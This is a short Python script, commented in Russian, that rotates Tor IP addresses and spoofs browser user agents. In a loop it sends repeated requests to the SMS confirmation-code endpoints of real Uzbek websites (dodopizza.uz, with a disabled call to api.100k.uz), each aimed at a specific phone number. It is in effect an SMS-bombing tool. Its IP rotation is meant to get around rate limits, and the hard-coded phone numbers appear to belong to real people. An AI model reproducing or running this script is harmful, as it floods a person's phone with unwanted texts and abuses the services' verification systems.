import requests
import socks
import socket
import time, random
from stem import Signal
from stem.control import Controller
import subprocess
from fake_useragent import UserAgent

def restart_tor():
    try:
        subprocess.run(["sudo", "service", "tor", "restart"])
        print("Tor service restarted successfully")
    except subprocess.CalledProcessError as e:
        print("Failed to restart Tor service:", e)

# Перезапуск службы Tor перед выполнением основного кода

# Функция для получения текущего IP-адреса через Tor
def get_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip_address = response.json()['ip']
        print("Your IP address is:", ip_address)
    except Exception as e:
        print("Failed to retrieve IP address:", e)

# Функция для смены IP-адреса через Tor
def renew_connection():
    try:
        controller = Controller.from_port(port=9051)  # Порт управляющего сокета Tor
        controller.authenticate()
        controller.signal(Signal.NEWNYM)
        time.sleep(controller.get_newnym_wait())
    except Exception as e:
        print("Failed to renew Tor connection:", e)
restart_tor()
# Установка Tor proxy
socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)  # Используем localhost вместо IPv6
socket.socket = socks.socksocket

# Первый вызов get_ip()
get_ip()

# Смена IP-адреса через Tor четыре раза
for i in range(10): 

    renew_connection()
    get_ip()
    user = UserAgent().random
    headers = {'user-agent': user}
    print("hello", user)
    phone =  "+998938811565"
    if i == 3 :
        phone =  "+998935648420"
    usernames = ["user1", "user2", "user3", "user4", "user5", "user6", "user7", "user8", "user9"]
    # try:
        
    #     response = requests.post('https://api.100k.uz/api/auth/sms-login', json={'phone': phone, 'username': random.choice(usernames)})
    #     print(response)
    # except:
    #     print("something went wrong")

    try:
        response = requests.post('https://dodopizza.uz/api/sendconfirmationcode',data={'phoneNumber':'+998938811565'})
        print(response)
    except:
        print("something went wrong")

    restart_tor()
    time.sleep(1)  # Подождите некоторое время между каждой сменой IP-адреса


# Финальный вызов get_ip()
get_ip()
